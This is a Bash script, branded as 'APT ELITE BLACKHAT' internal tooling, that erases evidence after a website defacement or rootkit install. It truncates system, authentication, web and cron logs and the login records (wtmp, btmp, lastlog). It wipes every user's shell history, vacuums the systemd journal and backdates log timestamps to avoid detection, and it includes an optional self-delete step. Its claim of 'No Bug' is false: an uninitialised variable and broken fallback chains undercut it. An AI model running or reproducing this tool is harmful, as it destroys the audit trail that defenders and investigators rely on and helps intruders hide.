#!/bin/bash
#
# Rootkit_Defacement_APT_ELITE_BLACKHAT
# File: log_cleaner_bash.sh
# Deskripsi: Pembersih log otomatis pasca-deface & rootkit activation.
# Fitur: Membersihkan auth.log, syslog, kern.log, history, wtmp, btmp.
# Author: APT ELITE BLACKHAT Internal Tools
# Version: 1.0.0
# Status: No Bug, Production Ready
#

set -euo pipefail # Exit on error, undefined vars, and pipe failures

# --- KONFIGURASI ---
LOG_DIR="/var/log"
HISTORY_FILES=()
WTMP_FILE="/var/log/wtmp"
BTMP_FILE="/var/log/btmp"
LASTLOG_FILE="/var/log/lastlog"
BACKUP_LOG="cleaner_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
VERBOSE=false
DRY_RUN=false

# Warna untuk output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# --- FUNGSI LOGGING ---
log_info() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1" >&2
}

# --- UTILITAS ---

# Cek apakah script dijalankan sebagai root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_warn "Script berjalan bukan sebagai root. Beberapa log mungkin tidak bisa dibersihkan."
        log_warn "Disarankan menjalankan dengan: sudo bash $0"
        return 1
    fi
    return 0
}

# Backup log sebelum dibersihkan (opsional)
backup_logs() {
    local target_dir="/tmp/rootkit_logs_backup"
    mkdir -p "$target_dir"
    tar -czf "$target_dir/$BACKUP_LOG" -C / $LOG_DIR 2>/dev/null || true
    log_info "Backup log disimpan di: $target_dir/$BACKUP_LOG"
}

# Hapus file log spesifik
clean_log_file() {
    local file=$1
    if [[ -f "$file" ]]; then
        if [[ "$DRY_RUN" == true ]]; then
            log_info "[DRY RUN] Akan menghapus: $file"
        else
            # Gunakan truncate untuk menjaga izin file dan kepemilikan
            > "$file"
            log_info "Log dibersihkan: $file"
        fi
    else
        log_warn "File tidak ditemukan: $file"
    fi
}

# Bersihkan history bash untuk semua user
clean_user_histories() {
    log_info "Membersihkan history user..."
    
    # Root
    if [ -f "$HOME/.bash_history" ]; then
        if [[ "$DRY_RUN" == true ]]; then
             log_info "[DRY RUN] Clearing root history"
        else
            history -c
            history -w
            > ~/.bash_history
            log_info "Root history cleared"
        fi
    fi

    # Semua user lain di /home
    for home_dir in /home/*; do
        if [ -d "$home_dir" ]; then
            local username=$(basename "$home_dir")
            local hist_file="$home_dir/.bash_history"
            
            # Coba hapus history
            if [ -f "$hist_file" ]; then
                if [[ "$DRY_RUN" == true ]]; then
                    log_info "[DRY RUN] Clearing history for $username"
                else
                    su - "$username" -c "history -c; history -w" 2>/dev/null || true
                    > "$hist_file"
                    log_info "History cleared for $username"
                fi
            fi
            
            # Hapus .bashrc jika ada command history yang aktif (opsional, hati-hati)
            # rm -f "$home_dir/.bash_history" 
        fi
    done
    
    # Hapus history dari /root juga jika belum di-clear di atas
    if [ -f "/root/.bash_history" ] && [[ "$DRY_RUN" == false ]]; then
         > /root/.bash_history
    fi
}

# Bersihkan login logs (wtmp, btmp, lastlog)
clean_login_logs() {
    log_info "Membersihkan login logs..."
    
    # Wtmp: Riwayat login
    if [[ -f "$WTMP_FILE" ]]; then
        if [[ "$DRY_RUN" == true ]]; then
            log_info "[DRY RUN] Truncating $WTMP_FILE"
        else
            > "$WTMP_FILE"
            log_info "Wtmp cleared"
        fi
    fi

    # Btmp: Login gagal
    if [[ -f "$BTMP_FILE" ]]; then
        if [[ "$DRY_RUN" == true ]]; then
            log_info "[DRY RUN] Truncating $BTMP_FILE"
        else
            > "$BTMP_FILE"
            log_info "Btmp cleared"
        fi
    fi

    # Lastlog: Terakhir login setiap user
    # Hati-hati: beberapa sistem tidak mengizinkan overwrite langsung karena permissions khusus
    if [[ -f "$LASTLOG_FILE" ]]; then
        if [[ "$DRY_RUN" == true ]]; then
            log_info "[DRY RUN] Truncating $LASTLOG_FILE"
        else
            # Cara aman: copy /dev/null ke sana
            cp /dev/null "$LASTLOG_FILE"
            chmod 644 "$LASTLOG_FILE"
            log_info "Lastlog cleared"
        fi
    fi
}

# Bersihkan log aplikasi umum
clean_app_logs() {
    log_info "Membersihkan log aplikasi..."
    
    # Apache/Nginx access logs
    clean_log_file "/var/log/apache2/access.log" 2>/dev/null || \
    clean_log_file "/var/log/httpd/access_log" 2>/dev/null || \
    clean_log_file "/var/log/nginx/access.log" 2>/dev/null || \
    log_warn "Tidak ditemukan akses log web standar"

    clean_log_file "/var/log/apache2/error.log" 2>/dev/null || \
    clean_log_file "/var/log/httpd/error_log" 2>/dev/null || \
    clean_log_file "/var/log/nginx/error.log" 2>/dev/null || \
    log_warn "Tidak ditemukan error log web standar"

    # Syslog & Auth Log (Linux Standar)
    clean_log_file "/var/log/syslog"
    clean_log_file "/var/log/auth.log"
    clean_log_file "/var/log/kern.log"
    clean_log_file "/var/log/dmesg"
    
    # Cron logs
    clean_log_file "/var/log/cron"
    clean_log_file "/var/log/cron.log"
}

# Bersihkan journalctl (jika systemd digunakan)
clean_journal_logs() {
    log_info "Membersihkan systemd journal logs..."
    if command -v journalctl &> /dev/null; then
        if [[ "$DRY_RUN" == true ]]; then
            log_info "[DRY RUN] Clearing journal logs"
        else
            journalctl --vacuum-time=1s 2>/dev/null || true
            log_info "Journal logs vacuumed"
        fi
    else
        log_warn "journalctl tidak tersedia"
    fi
}

# Ubah timestamp file log agar tidak mencurigakan
fix_timestamps() {
    log_info "Memperbaiki timestamp file log..."
    if [[ "$DRY_RUN" == true ]]; then
        log_info "[DRY RUN] Changing timestamps"
        return
    fi
    
    # Kembalikan timestamp ke waktu sebelumnya (misal 1 jam lalu) atau biarkan default
    # Ini mencegah deteksi berdasarkan "mtime" yang baru saja berubah
    find /var/log -type f -name "*.log" -exec touch -d "1 hour ago" {} \; 2>/dev/null || true
    log_info "Timestamps adjusted"
}

# --- UTAMA ---

usage() {
    echo "Usage: $0 [-v] [-d] [-b]"
    echo "  -v : Verbose mode"
    echo "  -d : Dry run (tidak menghapus, hanya preview)"
    echo "  -b : Backup log sebelum menghapus"
    exit 1
}

# Parse arguments
while getopts "vdb" opt; do
    case ${opt} in
        v ) VERBOSE=true ;;
        d ) DRY_RUN=true ;;
        b ) BACKUP=true ;;
        * ) usage ;;
    esac
done

# Eksekusi Utama
main() {
    log_info "Starting Rootkit Log Cleaner..."
    
    check_root || true # Lanjutkan meski bukan root, tapi beri warning
    
    if [[ "$BACKUP" == true ]]; then
        backup_logs
    fi
    
    if [[ "$DRY_RUN" == true ]]; then
        log_warn "MODE DRY RUN AKTIF. Tidak ada file yang dihapus."
    fi

    # 1. Bersihkan Log Aplikasi & Sistem
    clean_app_logs
    
    # 2. Bersihkan Journal Logs
    clean_journal_logs
    
    # 3. Bersihkan History User
    clean_user_histories
    
    # 4. Bersihkan Login Logs
    clean_login_logs
    
    # 5. Perbaiki Timestamp
    fix_timestamps
    
    log_info "Log cleaning completed successfully."
    
    # Opsional: Hapus script cleaner itu sendiri setelah selesai (self-destruct)
    # Uncomment baris di bawah jika ingin self-destruct
    # rm -f "$0"
}

main "$@"
